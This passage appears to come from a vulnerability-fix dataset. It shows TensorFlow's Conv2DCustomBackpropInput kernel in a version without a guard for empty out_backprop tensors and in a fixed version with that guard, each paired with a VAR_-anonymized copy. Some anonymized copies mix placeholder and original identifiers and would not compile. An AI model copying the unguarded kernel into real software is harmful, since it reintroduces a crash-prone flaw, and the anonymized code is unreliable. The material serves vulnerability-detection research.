OP_REQUIRES_OK(
context,
GetWindowedOutputSizeVerbose(
dims.spatial_dims[1].input_size, dims.spatial_dims[1].filter_size,
dims.spatial_dims[1].stride, padding_,
&dims.spatial_dims[1].output_size, &pad_left, &pad_right));
if (pad_left == pad_right && pad_top == pad_bottom) {
if (LaunchXsmmBackwardInputConvolution<Device, T>()(
context, context->eigen_device<Device>(),
in_backprop->tensor<T, 4>(), filter.tensor<T, 4>(),
out_backprop.tensor<T, 4>(), dims.spatial_dims[0].input_size,
dims.spatial_dims[1].input_size,
static_cast<int>(dims.spatial_dims[0].stride),
static_cast<int>(dims.spatial_dims[1].stride),
static_cast<int>(pad_top), static_cast<int>(pad_left),
data_format_)) {
return;
}
}
#else
int64_t pad_top, pad_bottom;
int64_t pad_left, pad_right;
#endif
if (padding_ == Padding::EXPLICIT) {
pad_top = explicit_paddings_[2];
pad_bottom = explicit_paddings_[3];
pad_left = explicit_paddings_[4];
pad_right = explicit_paddings_[5];
}
OP_REQUIRES_OK(
context,
GetWindowedOutputSizeVerbose(
dims.spatial_dims[0].input_size, dims.spatial_dims[0].filter_size,
dims.spatial_dims[0].stride, padding_,
&dims.spatial_dims[0].output_size, &pad_top, &pad_bottom));
OP_REQUIRES_OK(
context,
GetWindowedOutputSizeVerbose(
dims.spatial_dims[1].input_size, dims.spatial_dims[1].filter_size,
dims.spatial_dims[1].stride, padding_,
&dims.spatial_dims[1].output_size, &pad_left, &pad_right));
const int filter_total_size = dims.spatial_dims[0].filter_size *
dims.spatial_dims[1].filter_size *
dims.in_depth;
const int output_image_size =
dims.spatial_dims[0].output_size * dims.spatial_dims[1].output_size;
const size_t l2_cache_size = 256LL << 10;
const size_t l3_cache_size = 30LL << 20;
const size_t target_working_set_size = l3_cache_size / sizeof(T);
const size_t size_A = output_image_size * dims.out_depth;
const size_t size_B = filter_total_size * dims.out_depth;
const size_t size_C = output_image_size * filter_total_size;
const size_t work_unit_size = size_A + size_B + size_C;
auto worker_threads = *(context->device()->tensorflow_cpu_worker_threads());
const size_t thread_work_unit_size =
work_unit_size / worker_threads.num_threads;
const size_t min_thread_work_unit_size = l2_cache_size / sizeof(T);
const bool use_parallel_contraction =
dims.batch_size == 1 ||
thread_work_unit_size >= min_thread_work_unit_size;
OP_REQUIRES(
context, work_unit_size > 0,
errors::InvalidArgument(""input, filter_sizes and out_backprop tensors ""
""must all have at least 1 element""));
const size_t shard_size =
use_parallel_contraction
? 1
: (target_working_set_size + work_unit_size - 1) / work_unit_size;
Tensor col_buffer;
OP_REQUIRES_OK(context,
context->allocate_temp(
DataTypeToEnum<T>::value,
TensorShape({static_cast<int64_t>(shard_size),
static_cast<int64_t>(output_image_size),
static_cast<int64_t>(filter_total_size)}),
&col_buffer));
const int input_offset = dims.spatial_dims[0].input_size *
dims.spatial_dims[1].input_size * dims.in_depth;
const int output_offset = dims.spatial_dims[0].output_size *
dims.spatial_dims[1].output_size * dims.out_depth;
const T* filter_data = filter.template flat<T>().data();
T* col_buffer_data = col_buffer.template flat<T>().data();
const T* out_backprop_data = out_backprop.template flat<T>().data();
auto in_backprop_flat = in_backprop->template flat<T>();
T* input_backprop_data = in_backprop_flat.data();
in_backprop_flat.device(context->eigen_device<Device>()) =
in_backprop_flat.constant(T(0));
if (use_parallel_contraction) {
typedef Eigen::TensorMap<Eigen::Tensor<T, 2, Eigen::RowMajor>,
Eigen::Unaligned>
TensorMap;
typedef Eigen::TensorMap<Eigen::Tensor<const T, 2, Eigen::RowMajor>,
Eigen::Unaligned>
ConstTensorMap;
Eigen::array<Eigen::IndexPair<Eigen::DenseIndex>, 1> contract_dims;
contract_dims[0].first = 1;
contract_dims[0].second = 1;
for (int image_id = 0; image_id < dims.batch_size; ++image_id) {
TensorMap C(col_buffer_data, output_image_size, filter_total_size);
ConstTensorMap A(out_backprop_data + output_offset * image_id,
output_image_size, dims.out_depth);
ConstTensorMap B(filter_data, filter_total_size, dims.out_depth);
C.device(context->eigen_cpu_device()) = A.contract(B, contract_dims);
Col2im<T>(
col_buffer_data, dims.in_depth, dims.spatial_dims[0].input_size,
dims.spatial_dims[1].input_size, dims.spatial_dims[0].filter_size,
dims.spatial_dims[1].filter_size, pad_top, pad_left, pad_bottom,
pad_right, dims.spatial_dims[0].stride, dims.spatial_dims[1].stride,
input_backprop_data);
input_backprop_data += input_offset;
}
} else {
for (int image_id = 0; image_id < dims.batch_size;
image_id += shard_size) {
const int shard_limit =
std::min(static_cast<int>(shard_size),
static_cast<int>(dims.batch_size) - image_id);
auto shard = [&context, &dims, &pad_top, &pad_left, &pad_bottom,
&pad_right, &output_image_size, &filter_total_size,
&input_backprop_data, &col_buffer_data,
&out_backprop_data, &filter_data, &input_offset,
&output_offset, &size_C](int64_t start, int64_t limit) {
for (int shard_id = start; shard_id < limit; ++shard_id) {
T* im2col_buf = col_buffer_data + shard_id * size_C;
T* input_data = input_backprop_data + shard_id * input_offset;
const T* out_data = out_backprop_data + shard_id * output_offset;
Conv2DCustomBackpropInputMatMulFunctor<T>()(
context, out_data, filter_data, filter_total_size,
output_image_size, dims.out_depth, im2col_buf);
Col2im<T>(im2col_buf, dims.in_depth,
dims.spatial_dims[0].input_size,
dims.spatial_dims[1].input_size,
dims.spatial_dims[0].filter_size,
dims.spatial_dims[1].filter_size, pad_top, pad_left,
pad_bottom, pad_right, dims.spatial_dims[0].stride,
dims.spatial_dims[1].stride, input_data);
}
};
Shard(worker_threads.num_threads, worker_threads.workers, shard_limit,
work_unit_size, shard);
input_backprop_data += input_offset * shard_limit;
out_backprop_data += output_offset * shard_limit;
}
}
}","void Compute(OpKernelContext* VAR_0) override {
const Tensor& VAR_1 = VAR_0->input(0);
const Tensor& VAR_2 = VAR_0->input(1);
const Tensor& VAR_3 = VAR_0->input(2);
TensorShape VAR_4;
OP_REQUIRES_OK(VAR_0,
Conv2DBackpropComputeInputShape(VAR_1, VAR_2.shape(),
VAR_3.shape(),
VAR_5, &VAR_4));
ConvBackpropDimensions VAR_6;
OP_REQUIRES_OK(VAR_0,
ConvBackpropComputeDimensionsV2(
""Conv2DCustomBackpropInput"", 2,
VAR_4, VAR_2.shape(), VAR_3.shape(),
{1, 1, 1, 1}, VAR_7, VAR_8,
VAR_9, VAR_5, &VAR_6));
OP_REQUIRES(VAR_0, VAR_6.in_depth == VAR_2.shape().dim_size(2),
errors::InvalidArgument(
""Gradients for grouped convolutions are not ""
""supported on CPU. Please file a feature request if you ""
""run into this issue. Computed input depth "",
VAR_6.in_depth, "" doesn't match filter input depth "",
VAR_2.shape().dim_size(2)));
OP_REQUIRES(
VAR_0, VAR_6.out_depth == VAR_2.shape().dim_size(3),
errors::InvalidArgument(""Computed output depth "", VAR_6.out_depth,
"" doesn't match filter output depth "",
VAR_2.shape().dim_size(3)));
Tensor* VAR_10 = nullptr;
OP_REQUIRES_OK(VAR_0,
VAR_0->allocate_output(0, VAR_4, &VAR_10));
if (VAR_4.num_elements() == 0) {
return;
}
#if defined VAR_11 && \
defined VAR_12
int64 VAR_13, VAR_14;
int64 VAR_15, VAR_16;
OP_REQUIRES_OK(
VAR_0,
GetWindowedOutputSizeVerbose(
VAR_6.spatial_dims[0].input_size, VAR_6.spatial_dims[0].filter_size,
VAR_6.spatial_dims[0].stride, VAR_8,
&VAR_6.spatial_dims[0].output_size, &VAR_13, &VAR_14));
OP_REQUIRES_OK(
VAR_0,
GetWindowedOutputSizeVerbose(
VAR_6.spatial_dims[1].input_size, VAR_6.spatial_dims[1].filter_size,
VAR_6.spatial_dims[1].stride, VAR_8,
&VAR_6.spatial_dims[1].output_size, &VAR_15, &VAR_16));
if (VAR_15 == VAR_16 && VAR_13 == VAR_14) {
if (VAR_17<Device, T>()(
VAR_0, VAR_0->eigen_device<Device>(),
VAR_10->tensor<T, 4>(), VAR_2.tensor<T, 4>(),
VAR_3.tensor<T, 4>(), VAR_6.spatial_dims[0].input_size,
VAR_6.spatial_dims[1].input_size,
VAR_18<int>(VAR_6.spatial_dims[0].stride),
VAR_18<int>(VAR_6.spatial_dims[1].stride),
VAR_18<int>(VAR_13), VAR_18<int>(VAR_15),
VAR_5)) {
return;
}
}
#else
int64_t VAR_13, VAR_14;
int64_t VAR_15, VAR_16;
#endif
if (VAR_8 == Padding::EXPLICIT) {
VAR_13 = VAR_9[2];
VAR_14 = VAR_9[3];
VAR_15 = VAR_9[4];
VAR_16 = VAR_9[5];
}
OP_REQUIRES_OK(
VAR_0,
GetWindowedOutputSizeVerbose(
VAR_6.spatial_dims[0].input_size, VAR_6.spatial_dims[0].filter_size,
VAR_6.spatial_dims[0].stride, VAR_8,
&VAR_6.spatial_dims[0].output_size, &VAR_13, &VAR_14));
OP_REQUIRES_OK(
VAR_0,
GetWindowedOutputSizeVerbose(
VAR_6.spatial_dims[1].input_size, VAR_6.spatial_dims[1].filter_size,
VAR_6.spatial_dims[1].stride, VAR_8,
&VAR_6.spatial_dims[1].output_size, &VAR_15, &VAR_16));
const int VAR_19 = VAR_6.spatial_dims[0].filter_size *
VAR_6.spatial_dims[1].filter_size *
VAR_6.in_depth;
const int VAR_20 =
VAR_6.spatial_dims[0].output_size * VAR_6.spatial_dims[1].output_size;
const size_t VAR_21 = 256LL << 10;
const size_t VAR_22 = 30LL << 20;
const size_t VAR_23 = VAR_22 / sizeof(T);
const size_t VAR_24 = VAR_20 * VAR_6.out_depth;
const size_t VAR_25 = VAR_19 * VAR_6.out_depth;
const size_t VAR_26 = VAR_20 * VAR_19;
const size_t VAR_27 = VAR_24 + VAR_25 + VAR_26;
auto VAR_28 = *(VAR_0->device()->tensorflow_cpu_worker_threads());
const size_t VAR_29 =
VAR_27 / VAR_28.num_threads;
const size_t VAR_30 = VAR_21 / sizeof(T);
const bool VAR_31 =
VAR_6.batch_size == 1 ||
VAR_29 >= VAR_30;
OP_REQUIRES(
VAR_0, VAR_27 > 0,
errors::InvalidArgument(""input, filter_sizes and out_backprop tensors ""
""must all have at least 1 element""));
const size_t VAR_32 =
VAR_31
? 1
: (VAR_23 + VAR_27 - 1) / VAR_27;
Tensor VAR_33;
OP_REQUIRES_OK(VAR_0,
VAR_0->allocate_temp(
DataTypeToEnum<T>::value,
TensorShape({VAR_18<int64_t>(VAR_32),
VAR_18<int64_t>(VAR_20),
VAR_18<int64_t>(VAR_19)}),
&VAR_33));
const int VAR_34 = VAR_6.spatial_dims[0].input_size *
VAR_6.spatial_dims[1].input_size * VAR_6.in_depth;
const int VAR_35 = VAR_6.spatial_dims[0].output_size *
VAR_6.spatial_dims[1].output_size * VAR_6.out_depth;
const T* VAR_36 = VAR_2.template flat<T>().data();
T* VAR_37 = VAR_33.template flat<T>().data();
const T* VAR_38 = VAR_3.template flat<T>().data();
auto VAR_39 = VAR_10->template flat<T>();
T* VAR_40 = VAR_39.data();
VAR_39.device(VAR_0->eigen_device<Device>()) =
VAR_39.constant(T(0));
if (VAR_31) {
typedef Eigen::TensorMap<Eigen::Tensor<T, 2, Eigen::RowMajor>,
Eigen::Unaligned>
TensorMap;
typedef Eigen::TensorMap<Eigen::Tensor<const T, 2, Eigen::RowMajor>,
Eigen::Unaligned>
ConstTensorMap;
Eigen::array<Eigen::IndexPair<Eigen::DenseIndex>, 1> VAR_41;
VAR_41[0].first = 1;
VAR_41[0].second = 1;
for (int VAR_42 = 0; VAR_42 < VAR_6.batch_size; ++VAR_42) {
TensorMap C(col_buffer_data, output_image_size, filter_total_size);
ConstTensorMap VAR_43(VAR_38 + VAR_35 * VAR_42,
output_image_size, VAR_6.out_depth);
ConstTensorMap VAR_44(VAR_36, filter_total_size, VAR_6.out_depth);
VAR_45.device(VAR_0->eigen_cpu_device()) = VAR_43.contract(VAR_44, VAR_41);
VAR_46<T>(
col_buffer_data, VAR_6.in_depth, VAR_6.spatial_dims[0].input_size,
VAR_6.spatial_dims[1].input_size, VAR_6.spatial_dims[0].filter_size,
VAR_6.spatial_dims[1].filter_size, VAR_13, VAR_15, VAR_14,
VAR_16, VAR_6.spatial_dims[0].stride, VAR_6.spatial_dims[1].stride,
VAR_40);
VAR_40 += VAR_34;
}
} else {
for (int VAR_42 = 0; VAR_42 < VAR_6.batch_size;
VAR_42 += VAR_32) {
const int VAR_47 =
std::min(VAR_18<int>(VAR_32),
VAR_18<int>(VAR_6.batch_size) - VAR_42);
auto VAR_48 = [&VAR_0, &VAR_6, &VAR_13, &VAR_15, &VAR_14,
&VAR_16, &output_image_size, &filter_total_size,
&VAR_40, &col_buffer_data,
&VAR_38, &VAR_36, &VAR_34,
&VAR_35, &VAR_26](int64_t VAR_49, int64_t VAR_50) {
for (int VAR_51 = VAR_49; VAR_51 < VAR_50; ++VAR_51) {
T* VAR_52 = col_buffer_data + VAR_51 * VAR_26;
T* VAR_53 = VAR_40 + VAR_51 * VAR_34;
const T* VAR_54 = VAR_38 + VAR_51 * VAR_35;
VAR_55<T>()(
VAR_0, VAR_54, VAR_36, filter_total_size,
output_image_size, VAR_6.out_depth, VAR_52);
VAR_46<T>(VAR_52, VAR_6.in_depth,
VAR_6.spatial_dims[0].input_size,
VAR_6.spatial_dims[1].input_size,
VAR_6.spatial_dims[0].filter_size,
VAR_6.spatial_dims[1].filter_size, VAR_13, VAR_15,
VAR_14, VAR_16, VAR_6.spatial_dims[0].stride,
VAR_6.spatial_dims[1].stride, VAR_53);
}
};
Shard(VAR_28.num_threads, VAR_28.workers, VAR_47,
VAR_27, VAR_48);
VAR_40 += VAR_34 * VAR_47;
VAR_38 += VAR_35 * VAR_47;
}
}
}",,"void Compute(OpKernelContext* context) override {
    const Tensor& input_sizes = context->input(0);
    const Tensor& filter = context->input(1);
    const Tensor& out_backprop = context->input(2);

    TensorShape input_shape;
    OP_REQUIRES_OK(context,
                   Conv2DBackpropComputeInputShape(input_sizes, filter.shape(),
                                                   out_backprop.shape(),
                                                   data_format_, &input_shape));

    ConvBackpropDimensions dims;
    OP_REQUIRES_OK(context,
                   ConvBackpropComputeDimensionsV2(
                       ""Conv2DCustomBackpropInput"", /*num_spatial_dims=*/2,
                       input_shape, filter.shape(), out_backprop.shape(),
                       /*dilations=*/{1, 1, 1, 1}, strides_, padding_,
                       explicit_paddings_, data_format_, &dims));

    OP_REQUIRES(context, dims.in_depth == filter.shape().dim_size(2),
                errors::InvalidArgument(
                    ""Gradients for grouped convolutions are not ""
                    ""supported on CPU. Please file a feature request if you ""
                    ""run into this issue. Computed input depth "",
                    dims.in_depth, "" doesn't match filter input depth "",
                    filter.shape().dim_size(2)));
    OP_REQUIRES(
        context, dims.out_depth == filter.shape().dim_size(3),
        errors::InvalidArgument(""Computed output depth "", dims.out_depth,
                                "" doesn't match filter output depth "",
                                filter.shape().dim_size(3)));

    Tensor* in_backprop = nullptr;
    OP_REQUIRES_OK(context,
                   context->allocate_output(0, input_shape, &in_backprop));

    // If there is nothing to compute, return.
    if (input_shape.num_elements() == 0) {
      return;
    }

    // If shapes are valid but `out_backprop` is empty, in_backprop should be
    // set to all zeros.  Otherwise, cudnn/dnnl fail with an empty input.
    if (out_backprop.NumElements() == 0) {
      functor::SetZeroFunctor<Device, T> set_zero;
      set_zero(context->eigen_device<Device>(),
               in_backprop->template flat<T>());
      return;
    }

// TODO(ezhulenev): Remove custom kernel and move XSMM support to
// LaunchConv2DBackpropInputOp functor.
#if defined TENSORFLOW_USE_LIBXSMM_CONVOLUTIONS && \
    defined TENSORFLOW_USE_LIBXSMM_BACKWARD_CONVOLUTIONS
    int64 pad_top, pad_bottom;
    int64 pad_left, pad_right;
    OP_REQUIRES_OK(
        context,
        GetWindowedOutputSizeVerbose(
            dims.spatial_dims[0].input_size, dims.spatial_dims[0].filter_size,
            dims.spatial_dims[0].stride, padding_,
            &dims.spatial_dims[0].output_size, &pad_top, &pad_bottom));
    OP_REQUIRES_OK(
        context,
        GetWindowedOutputSizeVerbose(
            dims.spatial_dims[1].input_size, dims.spatial_dims[1].filter_size,
            dims.spatial_dims[1].stride, padding_,
            &dims.spatial_dims[1].output_size, &pad_left, &pad_right));

    if (pad_left == pad_right && pad_top == pad_bottom) {
      if (LaunchXsmmBackwardInputConvolution<Device, T>()(
              context, context->eigen_device<Device>(),
              in_backprop->tensor<T, 4>(), filter.tensor<T, 4>(),
              out_backprop.tensor<T, 4>(), dims.spatial_dims[0].input_size,
              dims.spatial_dims[1].input_size,
              static_cast<int>(dims.spatial_dims[0].stride),
              static_cast<int>(dims.spatial_dims[1].stride),
              static_cast<int>(pad_top), static_cast<int>(pad_left),
              data_format_)) {
        return;
      }
    }
#else
    int64_t pad_top, pad_bottom;
    int64_t pad_left, pad_right;
#endif
    if (padding_ == Padding::EXPLICIT) {
      pad_top = explicit_paddings_[2];
      pad_bottom = explicit_paddings_[3];
      pad_left = explicit_paddings_[4];
      pad_right = explicit_paddings_[5];
    }
    OP_REQUIRES_OK(
        context,
        GetWindowedOutputSizeVerbose(
            dims.spatial_dims[0].input_size, dims.spatial_dims[0].filter_size,
            dims.spatial_dims[0].stride, padding_,
            &dims.spatial_dims[0].output_size, &pad_top, &pad_bottom));
    OP_REQUIRES_OK(
        context,
        GetWindowedOutputSizeVerbose(
            dims.spatial_dims[1].input_size, dims.spatial_dims[1].filter_size,
            dims.spatial_dims[1].stride, padding_,
            &dims.spatial_dims[1].output_size, &pad_left, &pad_right));

    // The total dimension size of each kernel.
    const int filter_total_size = dims.spatial_dims[0].filter_size *
                                  dims.spatial_dims[1].filter_size *
                                  dims.in_depth;
    // The output image size is the spatial size of the output.
    const int output_image_size =
        dims.spatial_dims[0].output_size * dims.spatial_dims[1].output_size;

    // TODO(andydavis) Get L2/L3 cache sizes from device.
    const size_t l2_cache_size = 256LL << 10;
    const size_t l3_cache_size = 30LL << 20;

    // Use L3 cache size as target working set size.
    const size_t target_working_set_size = l3_cache_size / sizeof(T);

    // Calculate size of matrices involved in MatMul: C = A x B.
    const size_t size_A = output_image_size * dims.out_depth;

    const size_t size_B = filter_total_size * dims.out_depth;

    const size_t size_C = output_image_size * filter_total_size;

    const size_t work_unit_size = size_A + size_B + size_C;

    auto worker_threads = *(context->device()->tensorflow_cpu_worker_threads());

    // Calculate per-thread work unit size.
    const size_t thread_work_unit_size =
        work_unit_size / worker_threads.num_threads;

    // Set minimum per-thread work unit size to size of L2 cache.
    const size_t min_thread_work_unit_size = l2_cache_size / sizeof(T);

    // Use parallel tensor contractions if there is no batching, or if the
    // minimum per-thread work unit size threshold has been exceeded.
    // Otherwise, revert to multiple single-threaded matmul ops running in
    // parallel to keep all threads busy.
    // TODO(andydavis) Explore alternatives to branching the code in this way
    // (i.e. run multiple, parallel tensor contractions in another thread pool).
    const bool use_parallel_contraction =
        dims.batch_size == 1 ||
        thread_work_unit_size >= min_thread_work_unit_size;

    OP_REQUIRES(
        context, work_unit_size > 0,
        errors::InvalidArgument(""input, filter_sizes and out_backprop tensors ""
                                ""must all have at least 1 element""));

    const size_t shard_size =
        use_parallel_contraction
            ? 1
            : (target_working_set_size + work_unit_size - 1) / work_unit_size;

    Tensor col_buffer;
    OP_REQUIRES_OK(context,
                   context->allocate_temp(
                       DataTypeToEnum<T>::value,
                       TensorShape({static_cast<int64_t>(shard_size),
                                    static_cast<int64_t>(output_image_size),
                                    static_cast<int64_t>(filter_total_size)}),
                       &col_buffer));

    // The input offset corresponding to a single input image.
    const int input_offset = dims.spatial_dims[0].input_size *
                             dims.spatial_dims[1].input_size * dims.in_depth;
    // The output offset corresponding to a single output image.
    const int output_offset = dims.spatial_dims[0].output_size *
                              dims.spatial_dims[1].output_size * dims.out_depth;

    const T* filter_data = filter.template flat<T>().data();
    T* col_buffer_data = col_buffer.template flat<T>().data();
    const T* out_backprop_data = out_backprop.template flat<T>().data();

    auto in_backprop_flat = in_backprop->template flat<T>();
    T* input_backprop_data = in_backprop_flat.data();
    in_backprop_flat.device(context->eigen_device<Device>()) =
        in_backprop_flat.constant(T(0));

    if (use_parallel_contraction) {
      typedef Eigen::TensorMap<Eigen::Tensor<T, 2, Eigen::RowMajor>,
                               Eigen::Unaligned>
          TensorMap;
      typedef Eigen::TensorMap<Eigen::Tensor<const T, 2, Eigen::RowMajor>,
                               Eigen::Unaligned>
          ConstTensorMap;

      // Initialize contraction dims (we need to transpose 'B' below).
      Eigen::array<Eigen::IndexPair<Eigen::DenseIndex>, 1> contract_dims;
      contract_dims[0].first = 1;
      contract_dims[0].second = 1;

      for (int image_id = 0; image_id < dims.batch_size; ++image_id) {
        // Compute gradient into col_buffer.
        TensorMap C(col_buffer_data, output_image_size, filter_total_size);

        ConstTensorMap A(out_backprop_data + output_offset * image_id,
                         output_image_size, dims.out_depth);
        ConstTensorMap B(filter_data, filter_total_size, dims.out_depth);

        C.device(context->eigen_cpu_device()) = A.contract(B, contract_dims);

        Col2im<T>(
            col_buffer_data, dims.in_depth, dims.spatial_dims[0].input_size,
            dims.spatial_dims[1].input_size, dims.spatial_dims[0].filter_size,
            dims.spatial_dims[1].filter_size, pad_top, pad_left, pad_bottom,
            pad_right, dims.spatial_dims[0].stride, dims.spatial_dims[1].stride,
            input_backprop_data);

        input_backprop_data += input_offset;
      }
    } else {
      for (int image_id = 0; image_id < dims.batch_size;
           image_id += shard_size) {
        const int shard_limit =
            std::min(static_cast<int>(shard_size),
                     static_cast<int>(dims.batch_size) - image_id);

        auto shard = [&context, &dims, &pad_top, &pad_left, &pad_bottom,
                      &pad_right, &output_image_size, &filter_total_size,
                      &input_backprop_data, &col_buffer_data,
                      &out_backprop_data, &filter_data, &input_offset,
                      &output_offset, &size_C](int64_t start, int64_t limit) {
          for (int shard_id = start; shard_id < limit; ++shard_id) {
            T* im2col_buf = col_buffer_data + shard_id * size_C;
            T* input_data = input_backprop_data + shard_id * input_offset;
            const T* out_data = out_backprop_data + shard_id * output_offset;

            Conv2DCustomBackpropInputMatMulFunctor<T>()(
                context, out_data, filter_data, filter_total_size,
                output_image_size, dims.out_depth, im2col_buf);

            Col2im<T>(im2col_buf, dims.in_depth,
                      dims.spatial_dims[0].input_size,
                      dims.spatial_dims[1].input_size,
                      dims.spatial_dims[0].filter_size,
                      dims.spatial_dims[1].filter_size, pad_top, pad_left,
                      pad_bottom, pad_right, dims.spatial_dims[0].stride,
                      dims.spatial_dims[1].stride, input_data);
          }
        };
        Shard(worker_threads.num_threads, worker_threads.workers, shard_limit,
              work_unit_size, shard);

        input_backprop_data += input_offset * shard_limit;
        out_backprop_data += output_offset * shard_limit;
      }
    }
  }","void Compute(OpKernelContext* VAR_0) override {
    const Tensor& VAR_1 = VAR_0->input(0);
    const Tensor& VAR_2 = VAR_0->input(1);
    const Tensor& VAR_3 = VAR_0->input(2);

    TensorShape VAR_4;
    OP_REQUIRES_OK(VAR_0,
                   Conv2DBackpropComputeInputShape(VAR_1, VAR_2.shape(),
                                                   VAR_3.shape(),
                                                   VAR_5, &VAR_4));

    ConvBackpropDimensions VAR_6;
    OP_REQUIRES_OK(VAR_0,
                   ConvBackpropComputeDimensionsV2(
                       ""Conv2DCustomBackpropInput"", /* COMMENT_0 */2,
                       VAR_4, VAR_2.shape(), VAR_3.shape(),
                       /* COMMENT_1 */{1, 1, 1, 1}, VAR_7, VAR_8,
                       VAR_9, VAR_5, &VAR_6));

    OP_REQUIRES(VAR_0, VAR_6.in_depth == VAR_2.shape().dim_size(2),
                errors::InvalidArgument(
                    ""Gradients for grouped convolutions are not ""
                    ""supported on CPU. Please file a feature request if you ""
                    ""run into this issue. Computed input depth "",
                    VAR_6.in_depth, "" doesn't match filter input depth "",
                    VAR_2.shape().dim_size(2)));
    OP_REQUIRES(
        VAR_0, VAR_6.out_depth == VAR_2.shape().dim_size(3),
        errors::InvalidArgument(""Computed output depth "", VAR_6.out_depth,
                                "" doesn't match filter output depth "",
                                VAR_2.shape().dim_size(3)));

    Tensor* VAR_10 = nullptr;
    OP_REQUIRES_OK(VAR_0,
                   VAR_0->allocate_output(0, VAR_4, &VAR_10));

    /* COMMENT_2 */
    if (VAR_4.num_elements() == 0) {
      return;
    }

    /* COMMENT_3 */
    /* COMMENT_4 */
    if (VAR_3.NumElements() == 0) {
      functor::SetZeroFunctor<Device, T> VAR_11;
      VAR_11(VAR_0->eigen_device<Device>(),
               VAR_10->template flat<T>());
      return;
    }

/* COMMENT_5 */
/* COMMENT_6 */
#if defined VAR_12 && \
    defined VAR_13
    int64 VAR_14, VAR_15;
    int64 VAR_16, VAR_17;
    OP_REQUIRES_OK(
        VAR_0,
        GetWindowedOutputSizeVerbose(
            VAR_6.spatial_dims[0].input_size, VAR_6.spatial_dims[0].filter_size,
            VAR_6.spatial_dims[0].stride, VAR_8,
            &VAR_6.spatial_dims[0].output_size, &VAR_14, &VAR_15));
    OP_REQUIRES_OK(
        VAR_0,
        GetWindowedOutputSizeVerbose(
            VAR_6.spatial_dims[1].input_size, VAR_6.spatial_dims[1].filter_size,
            VAR_6.spatial_dims[1].stride, VAR_8,
            &VAR_6.spatial_dims[1].output_size, &VAR_16, &VAR_17));

    if (VAR_16 == VAR_17 && VAR_14 == VAR_15) {
      if (VAR_18<Device, T>()(
              VAR_0, VAR_0->eigen_device<Device>(),
              VAR_10->tensor<T, 4>(), VAR_2.tensor<T, 4>(),
              VAR_3.tensor<T, 4>(), VAR_6.spatial_dims[0].input_size,
              VAR_6.spatial_dims[1].input_size,
              VAR_19<int>(VAR_6.spatial_dims[0].stride),
              VAR_19<int>(VAR_6.spatial_dims[1].stride),
              VAR_19<int>(VAR_14), VAR_19<int>(VAR_16),
              VAR_5)) {
        return;
      }
    }
#else
    int64_t VAR_14, VAR_15;
    int64_t VAR_16, VAR_17;
#endif
    if (VAR_8 == Padding::EXPLICIT) {
      VAR_14 = VAR_9[2];
      VAR_15 = VAR_9[3];
      VAR_16 = VAR_9[4];
      VAR_17 = VAR_9[5];
    }
    OP_REQUIRES_OK(
        VAR_0,
        GetWindowedOutputSizeVerbose(
            VAR_6.spatial_dims[0].input_size, VAR_6.spatial_dims[0].filter_size,
            VAR_6.spatial_dims[0].stride, VAR_8,
            &VAR_6.spatial_dims[0].output_size, &VAR_14, &VAR_15));
    OP_REQUIRES_OK(
        VAR_0,
        GetWindowedOutputSizeVerbose(
            VAR_6.spatial_dims[1].input_size, VAR_6.spatial_dims[1].filter_size,
            VAR_6.spatial_dims[1].stride, VAR_8,
            &VAR_6.spatial_dims[1].output_size, &VAR_16, &VAR_17));

    /* COMMENT_7 */
    const int VAR_20 = VAR_6.spatial_dims[0].filter_size *
                                  VAR_6.spatial_dims[1].filter_size *
                                  VAR_6.in_depth;
    /* COMMENT_8 */
    const int VAR_21 =
        VAR_6.spatial_dims[0].output_size * VAR_6.spatial_dims[1].output_size;

    /* COMMENT_9 */
    const size_t VAR_22 = 256LL << 10;
    const size_t VAR_23 = 30LL << 20;

    /* COMMENT_10 */
    const size_t VAR_24 = VAR_23 / sizeof(T);

    /* COMMENT_11 */
    const size_t VAR_25 = VAR_21 * VAR_6.out_depth;

    const size_t VAR_26 = VAR_20 * VAR_6.out_depth;

    const size_t VAR_27 = VAR_21 * VAR_20;

    const size_t VAR_28 = VAR_25 + VAR_26 + VAR_27;

    auto VAR_29 = *(VAR_0->device()->tensorflow_cpu_worker_threads());

    /* COMMENT_12 */
    const size_t VAR_30 =
        VAR_28 / VAR_29.num_threads;

    /* COMMENT_13 */
    const size_t VAR_31 = VAR_22 / sizeof(T);

    /* COMMENT_14 */
    /* COMMENT_15 */
    /* COMMENT_16 */
    /* COMMENT_17 */
    /* COMMENT_18 */
    /* COMMENT_19 */
    const bool VAR_32 =
        VAR_6.batch_size == 1 ||
        VAR_30 >= VAR_31;

    OP_REQUIRES(
        VAR_0, VAR_28 > 0,
        errors::InvalidArgument(""input, filter_sizes and out_backprop tensors ""
                                ""must all have at least 1 element""));

    const size_t VAR_33 =
        VAR_32
            ? 1
            : (VAR_24 + VAR_28 - 1) / VAR_28;

    Tensor VAR_34;
    OP_REQUIRES_OK(VAR_0,
                   VAR_0->allocate_temp(
                       DataTypeToEnum<T>::value,
                       TensorShape({VAR_19<int64_t>(VAR_33),
                                    VAR_19<int64_t>(VAR_21),
                                    VAR_19<int64_t>(VAR_20)}),
                       &VAR_34));

    /* COMMENT_20 */
    const int VAR_35 = VAR_6.spatial_dims[0].input_size *
                             VAR_6.spatial_dims[1].input_size * VAR_6.in_depth;
    /* COMMENT_21 */
    const int VAR_36 = VAR_6.spatial_dims[0].output_size *
                              VAR_6.spatial_dims[1].output_size * VAR_6.out_depth;

    const T* VAR_37 = VAR_2.template flat<T>().data();
    T* VAR_38 = VAR_34.template flat<T>().data();
    const T* VAR_39 = VAR_3.template flat<T>().data();

    auto VAR_40 = VAR_10->template flat<T>();
    T* VAR_41 = VAR_40.data();
    VAR_40.device(VAR_0->eigen_device<Device>()) =
        VAR_40.constant(T(0));

    if (VAR_32) {
      typedef Eigen::TensorMap<Eigen::Tensor<T, 2, Eigen::RowMajor>,
                               Eigen::Unaligned>
          TensorMap;
      typedef Eigen::TensorMap<Eigen::Tensor<const T, 2, Eigen::RowMajor>,
                               Eigen::Unaligned>
          ConstTensorMap;

      /* COMMENT_22 */
      Eigen::array<Eigen::IndexPair<Eigen::DenseIndex>, 1> VAR_42;
      VAR_42[0].first = 1;
      VAR_42[0].second = 1;

      for (int VAR_43 = 0; VAR_43 < VAR_6.batch_size; ++VAR_43) {
        /* COMMENT_23 */
        TensorMap C(col_buffer_data, output_image_size, filter_total_size);

        ConstTensorMap VAR_44(VAR_39 + VAR_36 * VAR_43,
                         output_image_size, VAR_6.out_depth);
        ConstTensorMap VAR_45(VAR_37, filter_total_size, VAR_6.out_depth);

        VAR_46.device(VAR_0->eigen_cpu_device()) = VAR_44.contract(VAR_45, VAR_42);

        VAR_47<T>(
